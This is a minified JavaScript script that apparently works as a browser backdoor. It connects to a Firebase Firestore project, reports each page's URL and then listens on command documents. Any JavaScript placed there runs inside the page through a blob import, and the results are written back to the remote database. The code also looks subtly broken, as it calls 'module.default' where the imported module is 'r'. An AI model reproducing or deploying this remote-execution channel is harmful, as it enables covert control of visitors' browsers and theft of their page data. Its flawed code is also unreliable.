import{initializeApp as I}from"https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";import{getFirestore as G,onSnapshot,doc,setDoc}from"https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";var D=G(I({projectId:"fir-0013"})),rt=t=>doc(D,"jscommand",t),R=new Rf;function Ef(){this.env={},this.exe=async function(t){try{const e=new Blob([`export default ()=>{with(this){return ${t};}}`],{type:"application/javascript"}),o=URL.createObjectURL(e),r=await import(o),n=module.default.call(this.env);R.log(n),URL.revokeObjectURL(o)}catch(t){R.error(t)}}}var E=new Ef;function Rf(){this.log=function(t){var e=typeof t;"object"==typeof t&&(t=os(t,1)),setDoc(rt("jsrespon"),{text:t+"",type:e}),setTimeout(C,5)},this.error=function(t){setDoc(rt("jsresponerr"),{text:t+""}),setTimeout(C,5)}}function C(){try{setDoc(rt("jsrespon"),{text:"",type:""}),setDoc(rt("jsresponerr"),{text:""})}catch(t){console.error(t)}}function os(t,e,o){if("number"!=typeof o&&(o=0),"number"!=typeof e&&(e=1/0),o>e)return"[object Object]";if("function"==typeof t)return c+": "+t;if("object"==typeof t&&t instanceof HTMLElement)return t.outerHTML;for(var r="    ",n=0;n<o;n++)r+="    ";var s="{\\n"+r;for(var c in t)"object"==typeof t[c]?s+=c+": "+os(t[c],e,o+1)+",\\n"+r:s+=c+": "+t[c]+",\\n"+r;return s=s.slice(0,s.length-4),s+="}"}R.log(location.href+" is loaded!"),onSnapshot(rt("jscommanddoc"),t=>{var e=t.data().text;""!==e&&0==document.hidden&&E.exe(e)}),onSnapshot(rt("jscmdall"),t=>{var e=t.data().text;""!==e&&E.exe(e)}),console.respon=function(t){R.log(t)};